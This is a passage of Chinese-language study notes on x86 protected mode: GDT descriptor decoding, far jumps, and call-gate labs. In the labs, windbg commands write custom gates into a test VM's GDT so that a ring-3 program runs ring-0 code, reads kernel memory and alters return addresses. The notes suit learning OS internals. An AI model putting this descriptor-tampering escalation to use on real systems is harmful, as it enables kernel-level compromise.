00000000`00000000序号地址段描述符P位有效or无效S位TYPE域（第三个十六进制数）数据段or代码段E/CW/RA属性系统段属性08003f00000000000`000000000无效018003f00800cf9b00`0000ffff1有效1≥8，1011代码段011可执行，非一致代码段，可读，访问过28003f01000cf9300`0000ffff1有效1＜8，0011数据段011expand-up，可写，访问过38003f01800cffa00`0000ffff1有效1≥8，1010代码段010可执行，非一致代码段，可读，未访问过48003f02000cff300`0000ffff1有效1＜8，0011数据段011expand-up，可写，访问过58003f02880008b04`200020ab1有效01011系统段32-Bit TSS(Busy)68003f030ffc093df`f00000011有效1＜8，0011数据段011expand-up，可写，访问过78003f0380040f300`00000fff1有效1＜8，0011数据段011expand-up，可写，访问过88003f0400000f200`0400ffff1有效1＜8，0010数据段010expand-up，可写，未访问过98003f04800000000`000000000无效0108003f05080008954`af0000681有效01001系统段32-Bit TSS(Avaliable)118003f05880008954`af6800681有效01001系统段32-Bit TSS(Avaliable)128003f06000009302`2f40ffff1有效1＜8，0011数据段011expand-up，可写，访问过138003f0680000920b`80003fff1有效1＜8，0010数据段010expand-up，可写，未访问过148003f070ff0092ff`700003ff1有效1＜8，0010数据段010expand-up，可写，未访问过158003f07880009a40`0000ffff1有效1≥8，1010代码段010可执行，非一致代码段，可读，未访问过168003f08080009240`0000ffff1有效1＜8，0010数据段010expand-up，可写，未访问过178003f08800009200`000000001有效1＜8，0010数据段010expand-up，可写，未访问过188003f09000000000`000000000无效0198003f09800000000`000000000无效0208003f0a000000000`000000000无效0218003f0a800000000`000000000无效0228003f0b000000000`000000000无效0238003f0b800000000`000000000无效0248003f0c000000000`000000000无效0258003f0c800000000`000000000无效0268003f0d000000000`000000000无效0278003f0d800000000`000000000无效0288003f0e000000000`8003f1000无效0298003f0e800009200`0000ffff1有效1＜8，0010数据段010expand-up，可写，未访问过308003f0f08000984f`b68803b71有效1≥8，1000代码段000可执行，，非一致代码段，不可读，未访问过318003f0f800009200`0000ffff1有效1＜8，0010数据段010expand-up，可写，未访问过328003f10000000000`8003f1080无效0338003f10800000000`8003f1100无效0348003f11000000000`8003f1180无效0358003f11800000000`8003f1200无效0368003f12000000000`8003f1280无效0378003f12800000000`8003f1300无效0388003f13000000000`8003f1380无效0398003f13800000000`8003f1400无效0408003f14000000000`8003f1480无效0418003f14800000000`8003f1500无效0428003f15000000000`8003f1580无效0438003f15800000000`8003f1600无效0448003f16000000000`8003f1680无效0458003f16800000000`8003f1700无效0468003f17000000000`8003f1780无效0478003f17800000000`8003f1800无效0488003f18000000000`8003f1880无效0498003f18800000000`8003f1900无效0508003f19000000000`8003f1980无效0518003f19800000000`8003f1a00无效0528003f1a000000000`8003f1a80无效0538003f1a800000000`8003f1b00无效0548003f1b000000000`8003f1b80无效0558003f1b800000000`8003f1c00无效0568003f1c000000000`8003f1c80无效0578003f1c800000000`8003f1d00无效0588003f1d000000000`8003f1d80无效0598003f1d800000000`8003f1e00无效0608003f1e000000000`8003f1e80无效0618003f1e800000000`8003f1f00无效0628003f1f000000000`8003f1f80无效0638003f1f800000000`8003f2000无效0648003f20000000000`8003f2080无效0658003f20800000000`8003f2100无效0668003f21000000000`8003f2180无效0678003f21800000000`8003f2200无效0688003f22000000000`8003f2280无效0698003f22800000000`8003f2300无效0708003f23000000000`8003f2380无效0718003f23800000000`8003f2400无效0728003f24000000000`8003f2480无效0738003f24800000000`8003f2500无效0748003f25000000000`8003f2580无效0758003f25800000000`8003f2600无效0768003f26000000000`8003f2680无效0778003f26800000000`8003f2700无效0788003f27000000000`8003f2780无效0798003f27800000000`8003f2800无效0808003f28000000000`8003f2880无效0818003f28800000000`8003f2900无效0828003f29000000000`8003f2980无效0838003f29800000000`8003f2a00无效0848003f2a000000000`8003f2a80无效0858003f2a800000000`8003f2b00无效0868003f2b000000000`8003f2b80无效0878003f2b800000000`8003f2c00无效0888003f2c000000000`8003f2c80无效0898003f2c800000000`8003f2d00无效0908003f2d000000000`8003f2d80无效0918003f2d800000000`8003f2e00无效0928003f2e000000000`8003f2e80无效0938003f2e800000000`8003f2f00无效0948003f2f000000000`8003f2f80无效0958003f2f80000000`8003f3000无效0968003f30000000000`8003f3080无效0978003f30800000000`8003f3100无效0988003f31000000000`8003f3180无效0998003f31800000000`8003f3200无效01008003f32000000000`8003f3280无效01018003f32800000000`8003f3300无效01028003f33000000000`8003f3380无效01038003f33800000000`8003f3400无效01048003f34000000000`8003f3480无效01058003f34800000000`8003f3500无效01068003f35000000000`8003f3580无效01078003f35800000000`8003f3600无效01088003f36000000000`8003f3680无效01098003f36800000000`8003f3700无效01108003f37000000000`8003f3780无效01118003f37800000000`8003f3800无效01128003f38000000000`8003f3880无效01138003f38800000000`8003f3900无效01148003f39000000000`8003f3980无效01158003f39800000000`8003f3a00无效01168003f3a000000000`8003f3a80无效01178003f3a800000000`8003f3b00无效01188003f3b000000000`8003f3b80无效01198003f3b800000000`8003f3c00无效01208003f3c000000000`8003f3c80无效01218003f3c800000000`8003f3d00无效01228003f3d000000000`8003f3d80无效01238003f3d800000000`8003f3e00无效01248003f3e000000000`8003f3e80无效01258003f3e800000000`8003f3f00无效01268003f3f000000000`8003f3f80无效01278003f3f800000000`000000000无效0没见到有向下拓展的数据段。实际上，windows系统就没使用向下拓展的数据段"},{"title":"段间跳转","path":"/wiki/Protected_Mode/段间跳转.html","content":"本篇讲解代码间的跳转(段间跳转 非调用门之类的) 基本概念 段间跳转，有2种情况，即要跳转的段是一致代码段（conforming code segment）还是非一致代码段（nonconforming code segment），(段描述符中代码段TYPE域的C位来判断)。 同时修改CS与EIP的指令：JMP FAR/ CALL FAR/RETF /INT /IRETED 只改变EIP的指令：JMP/ CALL / JCC/RET 本篇只介绍段间跳转，故只使用JMP FAR，即为长跳转。 一致代码段和非一致代码段 一致代码段，也称为共享段： 特权级高的程序不允许访问特权级低的数据：核心态不允许访问用户态的数据。 共享段就是给特权级低的程序用的。 为什么特权级高的程序不允许访问特权级低的数据？解释：CPU会提供很多特性，但写操作系统的人用不用CPU提供的手段是另一码事。写操作系统的人可能觉得没必要或自己实现 特权级低的程序可以访问到特权级高的数据，但特权级不会改变：你是用户态，访问到了高权限的数据，但你本来是用户态，访问后还是用户态 对于普通代码段，也就是非一致代码段： 只允许同级访问 绝对禁止不同级别的访问：核心态不是用户态，用户态也不是核心态 操作系统提供了这么一段代码，该段代码提供了一些通用的功能，这些功能不会破坏到系统内核的数据。我希望让这类代码是可以直接让应用层来访问的，因为这样的要求，所以用一致代码段来修饰这段代码。 段间跳转流程 例子：CPU如何执行这行代码JMP 0x20:0x004183D7？ 流程如下： 段选择子拆分 0x20对应二进制：0000 0000 0010 0000 所以： RPL=0 TI=0 Index=4 查表得到段描述符 TI=O所以查GDT表，Index=4找到对应的段描述符。注意，只有段描述符是如下四种情况才可以跳转:代码段、调用门、TSS任务段、任务门。后面3种将会在以后的教程详细讲解。本次假设查到的是代码段，这一步的检查通过。 权限检查 代码段的权限检查 如果是非一致代码段，要求：CPL==DPL且RPL&lt;=DPL 如果是一致代码段，要求：CPL&gt;=DPL 加载段描述符 通过上面的权限检查后，CPU会将段描述符加载到CS段寄存器中。 代码执行 CPU将CS.Base + Offset的值写入EIP，然后跳转到将要执行的CS:EIP处的代码，段间跳转结束。（Offset是例子中的0x004183D7） 注：直接对代码段进行JMP或者CALL的操作，无论目标是一致代码段还是非一致代码段，CPL都不会发生改变。如果要提升CPL的权限，只能通过调用门。 实验 跳转指令 CPL 段选择子中的RPL 构造的段描述符 目标段描述符C位 DPL 预期结果 jmp far 0x4B:00401F40 3 3 00cffb00`0000ffff 非一致代码段 3 跳转成功 jmp far 0x4B:00401F40 3 3 00cf9b00`0000ffff 非一致代码段 0 跳转失败 jmp far 0x4B:00401F40 3 3 00cf9f00`0000ffff 一致代码段 0 跳转成功 jmp far 0x4B:00401F40 3 0 00cfff00`0000ffff 一致代码段 3 跳转成功 构造段描述符 找一个非一致代码段描述符,复制一份,写入到GDT表中 123456kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`00000000 比如找的这个段描述符，是个非一致代码段的描述符00cffb00`0000ffff。 将00cffb00`0000ffff数据写入某个P位为0的位置，比如8003f048。 windbg中修改，查看是否修改成功，然后g让虚拟机继续运行。 12345678kd&gt; eq 8003f048 00cffb00`0000ffffkd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00cffb00`0000ffffkd&gt; g OD中拖入一个程序，修改指令，然后F8单步执行（offset根据拖入的程序现找的） 1jmp far 0x4B:00401F40 目标段描述符为：非一致代码段+DPL为3目标段描述符：00cffb00`0000ffff非一致代码段，f=1111，DPL=11jmp构造的段选择子0x4B0000 0000 0100 10110000 0000 0100 1 0 11Index=9TI=0，查GDT表RPL=11CPL=3执行前分析：CPL为3，RPL为3，访问非一致代码段，DPL为3。预期：能成功跳转。修改指令后F8执行前执行后成功修改了CS和ip 目标段描述符为：非一致代码段+DPL为0将上个例子中的00cffb00`0000ffff的DPL修改成0，变成00cf9b00`0000ffff12345678kd&gt; eq 8003f048 00cf9b00`0000ffffkd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00cf9b00`0000ffffkd&gt; gOD中重新调试，跳转指令不变，然后F81jmp far 0x4B:00401F40执行前分析：CPL为3，RPL为3.访问非一致代码段，DPL为0预期：不能成功跳转。执行后：进入到了异常模块，跳转失败。 目标段描述符为：一致代码段+DPL为0将上个例子中00cf9b00`0000ffff修改成一致代码段，变成00cf9f00`0000ffff12345678kd&gt; eq 8003f048 00cf9f00`0000ffffkd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00cf9f00`0000ffffkd&gt; gOD中重新调试，跳转指令不变，然后F81jmp far 0x4B:00401F40执行前分析：CPL为3，RPL为3，访问一致代码段，DPL为0。预期：能成功跳转。执行后：成功跳转。 目标段描述符为：一致代码段+DPL为3将上个例子中00cf9f00`0000ffff的DPL修改为3，变成00cfff00`0000ffff12345678kd&gt; eq 8003f048 00cfff00`0000ffffkd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00cfff00`0000ffffkd&gt; gOD中重新调试，跳转指令不变，然后F81jmp far 0x4B:00401F40执行前分析：CPL为3，RPL为3，访问一致代码段，DPL为3。预期：能成功跳转。执行后：跳转成功。 问题 修改段描述符的base后无法执行,比如:00cffb000001ffff cs.base只能为0，如果是其他值，实验进行不下去。老师也不知道，是OD的bug还是什么，没深究。 在jmp far成功后,在OD中发现CS段的base和limit永远都是0。 这是OD的bug，没有刷新。jmp far后，可以用pchunter查看段寄存器最新的值。 总结 1、为了对数据进行保护，普通代码段是禁止不同级别进行访问的。用户态的代码不能访问内核的数据，同样，内核态的代码也不能访问用户态的数据。 2、如果想提供一些通用的功能，而且这些功能并不会破坏内核数据，那么可以选择一致代码段，这样低级别的程序可以在不提升CPL权限等级的情况下即可以访问。 3、如果想访问普通代码段，只有通过“调用门”等提升CPL权限，才能访问。"},{"title":"草稿本","path":"/wiki/Protected_Mode/草稿本.html","content":"英语单词 instruction 指令 IA-32和IA-32e的区别： IA-32, also known as the Intel Architecture, 32-bit, is the instruction set architecture (ISA) introduced by Intel in the 1980s with the 386 microprocessor. It’s a 32-bit version of Intel’s earlier 16-bit x86 architecture. The IA-32 architecture includes features such as protected mode, virtual memory, paging, and the ability to switch between real mode (for backward compatibility with the 8086) and the more advanced protected mode. IA-32e is a mode of operation in some Intel microprocessors that implements the Intel 64 or x86-64 architecture, which is a 64-bit version of the x86 instruction set. IA-32e mode, also known as Intel 64 mode, has two sub-modes: compatibility sub-mode and 64-bit sub-mode. In compatibility sub-mode, the processor can execute 32-bit and 16-bit applications under a 64-bit operating system. This allows for significant backward compatibility with older applications and operating systems. In 64-bit sub-mode, the processor can execute 64-bit applications and use 64-bit virtual addresses. This allows for the use of larger amounts of memory than is possible in a 32-bit system, and it provides for potentially faster computation because of the larger number of general-purpose and floating-point registers in the 64-bit architecture. In summary, the primary difference between IA-32 and IA-32e mode is the latter’s capability to support 64-bit computing, which allows for larger memory addressing and potentially faster computation. IA-32e mode also provides backward compatibility for running 32-bit and 16-bit applications under a 64-bit operating system. 百度云上的课前视频对应目录： https://www.bcdaren.com/video/videoContent/329494357092864000 滴水基础三期 可能有用的别人的课后作业： https://github.com/smallzhong/drip-education-homework https://github.com/123yonghu/- https://blog.csdn.net/weixin_43657383/article/details/130352367 实模式和保护模式 All Intel 64 and IA-32 processors enter real-address mode following a power-up or reset (see Chapter 10, “Processor Management and Initialization”). Software then initiates the switch from real-address mode to protected mode. If IA-32e mode operation is desired, software also initiates a switch from protected mode to IA- 32e mode 先进入实模式，然后进入保护模式 访问内存都要先通过GDT或LDT，找到段描述符，段描述符中含有这块内存的访问权限、类型、使用信息 When operating in protected mode, all memory accesses pass through either the global descriptor table (GDT) or an optional local descriptor table (LDT) as shown in Figure 2-1. These tables contain entries called segment descriptors. Segment descriptors provide the base address of segments well as access rights, type, and usage information. The linear address of the base of the GDT is contained in the GDT register (GDTR); the linear address of the LDT is contained in the LDT register (LDTR) 选择子16位 13位是段描述符的索引号 1位是 global/local 标志位 (determines whether the selector points to the GDT or the LDT), 1位是访问权限 还有access rights information. 段描述符结构： CPL，current privilege level(CPL) 2.1.2 系统段； the task-state segment (TSS) and the LDT TSSs and LDTs have segment descriptors defined for them. The GDT is not considered a segment because it is not accessed by means of a segment selector and segment descriptor 全局描述符表（GDT）不被认为是一个段，因为它不是通过段选择器和段描述符来访问的。 gates (call gates, interrupt gates, trap gates, and task gates Task gates are not supported in IA-32e mode 2.1.2.1 IA32-e gates 2.1.3任务门 interrupt descriptor table (IDT) Like the GDT, the IDT is not a segment. The linear address for the base of the IDT is contained in the IDT register (IDTR). IDT也不是一个段 2.1.4中断和异常处理 2.1.5内存管理 The base physical address of the paging-structure hierarchy is contained in control register CR3 物理内存，和虚拟内存（页面映射机制） 2.1.6 系统寄存器 2.4 内存管理寄存器 The processor provides four memory-management registers (GDTR, LDTR, IDTR, and TR) that specify the locations of the data structures which control segmented memory management (see Figure 2-6). Special instructions are provided for loading and storing these registers. 正课 02 段 页是CPU的概念 内核是操作系统的概念 白皮书 3卷，3，4，5，6，7章，保护模式 2卷，查指令 滴水课程 可能有用：https://github.com/yifengyou/learn-c/blob/master/docs/教程/滴水逆向视频教程.md 滴水三期正课：？ https://www.zygx8.com/thread-16226-1-1.html http://bbs.jiandaima.com/forum.php?mod=viewthread&amp;tid=3878 https://www.eyyba.com/thread-20094-1-1.html 中级班 保护模式 操作系统目录："},{"title":"调用门","path":"/wiki/Protected_Mode/调用门.html","content":"门描述符 To provide controlled access to code segments with different privilege levels, the processor provides special set of descriptors called gate descriptors. There are four kinds of gate descriptors: • Call gates • Trap gates • Interrupt gates • Task gates 调用门 描述符字段 P必须=1，表示该描述符有效。 S必须=0，表示是系统段。 Type是1100，表示是32bit调用门。 高字节7~5，保留字段。 Param Count 0~4，指明参数的个数，在有堆栈切换时会将这些参数压入新的堆栈中。调用门无参时是0；如果调用门有参是3个参数，这个字段就是3（十六进制） 跳转后新段的偏移由高字节31-16拼接低字节15-0组成（32位地址），也就是调用后EIP的位置。 Segment Selector，存储了另一个代码段的选择子。 调用门执行流程 指令格式： 1CALL CS:EIP 步骤： CS充当段选择子，查GDT表，找到的段描述符是一个调用门。 权限检查。需要调用者CPL的权限不低于DPL，即CPL≤DPL（数值上），看你是否有访问该调用门的权限。 调用门里的选择子指向的另一个段描述符的Base+调用门的Offset就是跳转的目标地址，CS的值最终是调用门描述符里Segment Selector的值（指向门描述符的段选择子不能加载到CS，门只是一个入口） 如果调用者CPL＞调用门中的段选择子指向代码段的DPL（数值上），则会自动提权。比如调用者是3环程序，使用调用门后变成0环权限。（代码3环，RPL任意，门3环，门内的代码段0环，则会自动提权） 如果调用者CPL≤调用门中的段选择子指向代码段的DPL，则不提权。 能否通过修改堆栈的值，然后retf提权？参考该链接的练习3：https://www.cnblogs.com/wingsummer/p/15353642.html不能。retf时和调用调用门时一样，会有权限检查。白皮书：A far return that requires a privilege-level change is only allowed when returning to a less privileged level (that is,the DPL of the return code segment is numerically greater than the CPL).只有在返回到较低权限级别（即返回代码段的DPL在数字上大于 CPL）时，才允许需要更改权限级别的远程返回。 实验 无参调用门 实验内容：构造无参的调用门，实现提权后做3件事：读取高2G的地址；分析堆栈情况；分析寄存器变化情况 具体过程构造调用门描述符并写入GDT表因为windows的GDT表格里没有现成的调用门，需要自己修改GDT表。构造过程：偏移地址：通过VC++，调试时反汇编得到裸函数的地址，高低4字节分别填写在Offset in Segment因为在windows里，所有的数据段和代码段base都是0。所以跳转后的地址就是门描述符里的OffsetP必须=1，表示描述符有效DPL=11，因为实验时写的程序是3环的，要让程序有敲门的权限S必须=0，表示是系统段Type必须=1100，表示是调用门7~5，保留，为0Param Count，无参实验，为0Segment Selector写0008，0环代码段，提权段选择子：不提权001B，3环代码段0000 0000 0001 1 0 11，Index为3提权0008，0环代码段0000 0000 0000 1 0 00，，Index为1序号地址段描述符数据段or代码段DPL18003f00800cf9b00`0000ffff代码段0038003f01800cffa00`0000ffff代码段11综上：高字节：按描述符字段：0000000000000000 1 11 0 1100 000 00000四位一组：0000 0000 0000 0000 1110 1100 0000 0000十六进制：0000EC00低字节：0008VC++查看到切换堆栈后的地址是：0040 1020完整：0040EC00`00081020将自己构造的调用门加入GDT表中：1234567891011121314kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`00000000kd&gt; eq 8003f048 0040EC00`00081020kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 0040ec00`00081020kd&gt; g测试代码12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;windows.h&gt;//切换堆栈后执行的代码void __declspec(naked) GetRegister()&#123; __asm &#123; int 3 //虽然这是3环程序，但通过调用门提权执行到这行指令时是0环权限。 //这个中断，会被0环调试器windbg捕捉到，VC6的调试器是断不下来的（原理涉及到调试方面的知识） retf //注意返回，不能是ret &#125;&#125;int main()&#123; char buff[6]; *(DWORD*)&amp;buff[0]=0x12345678; //低4字节，EIP，可以随便写 *(WORD*)&amp;buff[4]=0x48; //高16位，段选择子。0x48拆完索引到的是刚才修改的8003f048，中断门描述符 __asm &#123; call fword ptr[buff]; //长调用，需要6个字节 &#125; getchar(); return 0;&#125;执行前中后及分析执行前执行时执行后寄存器和堆栈情况：ESP=0012FF28,CS=001B,SS=0023执行时现象：操作系统产生中断，windbg中显示该操作系统被断下来了寄存器和堆栈情况：ESP=b2362dd0,CS=8,SS=10cs为8，是之前构造调用门时段选择子的8。esp是b开头的，比8大了，这不是低2G的空间，这是0环的堆栈下面这张图是第二次做实验截图的，部分寄存器数值可能与上面的不一样下两个断点，进入调试，到第一个断点时VC看寄存器，单步执行，在裸函数int 3处会在windbg里断下，在windbg里查看寄存器。windbg输入g，回到vc调试，查看寄存器。123 *(DWORD*)&amp;buff[0]=0x12345678; //低4字节，EIP，可以随便写getchar();其他寄存器，比如ebx,ecx,edx,esi,edi,ebpds、es、gs都没变海哥说的：ebp的变化其实不是必须的。但是我可能有点疑惑，就是函数调用时一般用ebp寻址，因为ebp比esp固定。但实验下来ebp确实没变。一套CPU，一个核一套寄存器。调用门提权后，只是esp指向的区域变了，即换了块内存区域使用堆栈。其他寄存器并没有变化，3环和0环使用的是同一套寄存器。实验中裸函数里pushad和pushfd是否是必须的？注：pushfd指令是把32位EFLAGS寄存器内容压入堆栈，popfd指令把堆栈单元内容弹出到EFLAGES寄存器。pushad指令是将所有32位通用寄存器压入堆栈，顺序是eax，ecx，edx，ebx，esp，ebp，esi和edi的顺序。popad指令按相反顺序将寄存器弹出堆栈。不是必须的，看情况，一般建议加上。因为call调用完回去后，这些通用寄存器和标志位在call里可能变了。call调用完后，如果你不想让这些变化影响到使用完call那些后续指令的执行。取决于开发者的用途和目的吧。修改代码，在0环时读取高2G的地址执行到裸函数这个函数块里时是0环权限，写内核程序不会报错下面这段代码相比于上一段，在裸函数里增加了：读高2G地址读GDTR寄存器1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;stdio.h&gt;#include &lt;windows.h&gt;BYTE GDT[6]=&#123;0&#125;;DWORD dwH2GValue;//切换堆栈后执行的代码void __declspec(naked) GetRegister()&#123; __asm &#123; //int 3 //让断点停在windbg，让我们分析下寄存器和堆栈 pushad pushfd mov eax,0x8003f00c //读取高2G的地址 mov ebx,[eax] mov dwH2GValue,ebx sgdt GDT //读GDTR寄存器 popfd popad retf //注意返回，不能是ret &#125;&#125;void PrintRegister()&#123; DWORD GDT_ADDR=*(PDWORD)(&amp;GDT[2]); WORD GDT_LIMIT=*(PWORD)(&amp;GDT[0]); printf(&quot;%x %x %x &quot;,dwH2GValue,GDT_ADDR,GDT_LIMIT);&#125;int main()&#123; // __asm //这里我没看明白干嘛呢，注释掉VC编译就不报错了 // &#123; // mov ebx,ebx // mov ebx,ebx // &#125; char buff[6]; *(DWORD*)&amp;buff[0]=0x12345678; //低4字节，EIP，可以随便写 *(WORD*)&amp;buff[4]=0x48; //高16位，段选择子。0x48拆完索引到的是刚才修改的8003f048，中断门描述符 __asm &#123; call fword ptr[buff]; //长调用，需要6个字节 &#125; PrintRegister(); getchar(); return 0;&#125;下断点，查看裸函数地址，重新构造调用门描述符，修改GDT表执行补充：有个细节修正下，sgdt指令其实在3环下也能用。SGDT is useful only by operating-system software. However, it can be used in application programs without causing an exception to be generated.From：Intel® 64 and IA-32 ArchitecturesSoftware Developer’s ManualVolume 2B:Instruction Set Reference, N-Z验证代码在VC中编译执行12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;windows.h&gt;BYTE GDT[6]=&#123;0&#125;;//切换堆栈后执行的代码void __declspec(naked) GetRegister()&#123; __asm &#123; sgdt GDT //读GDTR寄存器 ret &#125;&#125;void PrintRegister()&#123; DWORD GDT_ADDR=*(PDWORD)(&amp;GDT[2]); WORD GDT_LIMIT=*(PWORD)(&amp;GDT[0]); printf(&quot;%x %x &quot;,GDT_ADDR,GDT_LIMIT);&#125;int main()&#123; GetRegister(); PrintRegister(); getchar(); return 0;&#125; 有参调用门 实验1：构造有参的调用门，实现提权后正确依次取出参数并分析堆栈情况 实验过程构造调用门描述符并写入GDT表VC++查看到切换堆栈后的函数地址是：0040 de60传递参数个数3完整：0040EC03`0008de60将自己构造的调用门加入GDT表中：1234567891011121314kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`00000000kd&gt; eq 8003f048 0040EC03`0008de60kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 0040ec03`0008de60kd&gt; g测试代码代码分析：声明了三个全局变量x,y,z。调用门有参，call前手动压入三个参数，在调用门中分别将之前压的这三个参数赋值给全局变量x,y,z中。然后打印这三个值12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD x;DWORD y;DWORD z;void _declspec(naked) GateProc()&#123; _asm &#123; pushad pushfd mov eax,[esp+0x24+0x8+0x8] mov dword ptr ds:[x],eax mov eax,[esp+0x24+0x8+0x4] mov dword ptr ds:[y],eax mov eax,[esp+0x24+0x8+0x0] mov dword ptr ds:[z],eax popfd popad retf 0xC //注意堆栈平衡，防止蓝屏 &#125;&#125;void PrintArgs()&#123; printf(&quot;%x %x %x&quot;,x,y,z);&#125;int main()&#123; char buff[6]; *(DWORD*)&amp;buff[0] = 0x12345678; *(DWORD*)&amp;buff[4] = 0x4B; _asm &#123; push 1 push 2 push 3 call fword ptr[buff] &#125; PrintArgs(); getchar(); return 0;&#125;执行及结果分析堆栈分析：内联汇编那加个int 3断点12345678910111213141516171819_asm&#123; int 3 pushad pushfd mov eax,[esp+0x24+0x8+0x8] mov dword ptr ds:[x],eax mov eax,[esp+0x24+0x8+0x4] mov dword ptr ds:[y],eax mov eax,[esp+0x24+0x8+0x0] mov dword ptr ds:[z],eax popfd popad retf 0xC //注意堆栈平衡，防止蓝屏&#125;执行，会在windbg中断下来。然后查看堆栈情况代码分析：1234567891011121314151617181920void _declspec(naked) GateProc()&#123; _asm &#123; pushad pushfd mov eax,[esp+0x24+0x8+0x8] mov dword ptr ds:[x],eax mov eax,[esp+0x24+0x8+0x4] mov dword ptr ds:[y],eax mov eax,[esp+0x24+0x8+0x0] mov dword ptr ds:[z],eax popfd popad retf 0xC //注意堆栈平衡，防止蓝屏 &#125;&#125;0x24：是十六进制的36，因为前面的pushad会将8个32位寄存器压入堆栈中，即32个字节。pushfd将EFLAG寄存器压入堆栈中，也是4个字节，总和即为36个字节。0x8：返回地址和CS所占的总字节数。 考试题 构造—个调用门，实现3环读取高2G内存。 在第一题的基础上进行修改,实现通过翻墙的方式返回到其他地址。 在第一题的基础上进行修改,在门中再建一个门跳转到其他地址。 （以无参调用门来做实验） 题目2答案思路：提权后返回前把堆栈中的返回地址改成要去的地方门描述符的构造：0040EC00`00081030VC查看跳转函数PrintRegister_My的地址是：004010A0测试代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD dwH2GValue;//切换堆栈后执行的代码void __declspec(naked) GetRegister()&#123; __asm &#123; //int 3 //让断点停在windbg，让我们分析下寄存器和堆栈 pushad pushfd mov eax,0x8003f00c //读取高2G的地址 mov ebx,[eax] mov dwH2GValue,ebx //mov dword ptr [esp+0x24],0x4010A0; //修改堆栈中的返回地址 popfd popad retf //注意返回，不能是ret &#125;&#125;void PrintRegister_Main()&#123; printf(&quot;%x,Printed by PrintRegister_Main function &quot;,dwH2GValue);&#125;int PrintRegister_My()&#123; printf(&quot;%x,Printed by PrintRegister_My function &quot;,dwH2GValue); return 0;&#125;int main()&#123; char buff[6]; *(DWORD*)&amp;buff[0]=0x12345678; //低4字节，EIP，可以随便写 *(WORD*)&amp;buff[4]=0x48; //高16位，段选择子。0x48拆完索引到的是刚才修改的8003f048，中断门描述符 __asm &#123; call fword ptr[buff]; //长调用，需要6个字节 &#125; PrintRegister_Main(); getchar(); return 0;&#125;正常执行流程修改堆栈后离开 题目3答案这里我们拓展，多构造几个门描述符，都试一下第一个门描述符都是0040EC00`00081030序号第二个门描述符的值门描述符中的段选择子门描述符中指向的代码段调用方式设计目的执行结果10040EC00`000810500008index是1，0环代码段call0环跳0环，同一个代码段0环跳0环，可以20040EC00`001B10500018index是3，3环代码段call0环跳一个3环代码段0环跳3环，异常蓝屏30040EC00`007810500078index是15，0环代码段call0环跳另一个0环代码段理论0环跳0环，可以。见下面&gt;内容，会弹窗说遇到问题需要关闭代码段：序号地址段描述符数据段or代码段DPL18003f00800cf9b00`0000ffff代码段0038003f01800cffa00`0000ffff代码段11158003f07880009a40`0000ffff代码段00308003f0f08000984f`b68803b7代码段00序号15和序号30代码段，我用之前3环跳0环读高2G内存地址的测试代码执行，会有问题。不知道是什么原因，所以题目3这里就只用序号1这个代码段序号15的段选择子：0078序号30的段选择子：00C0序号1：0环跳0环，同一个代码段第一个门描述符：0040EC00`00081030第二个门描述符：0040EC00`00081050修改GDT表：寻第一个门描述符位置8003f048的段选择子：0x48寻第二个门描述符位置8003f098的段选择子：0x9812kd&gt; eq 8003f048 0040EC00`00081030kd&gt; eq 8003f098 0040EC00`0008105012345678910111213141516171819202122232425kd&gt; dq 8003f000 L148003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`000000008003f050 80008954`af000068 80008954`af6800688003f060 00009302`2f40ffff 0000920b`80003fff8003f070 ff0092ff`700003ff 80009a40`0000ffff8003f080 80009240`0000ffff 00009200`000000008003f090 00000000`00000000 00000000`00000000kd&gt; eq 8003f048 0040EC00`00081030kd&gt; eq 8003f098 0040EC00`00081050kd&gt; dq 8003f000 L148003f000 00000000`00000000 00cf9b00`0000ffff8003f010 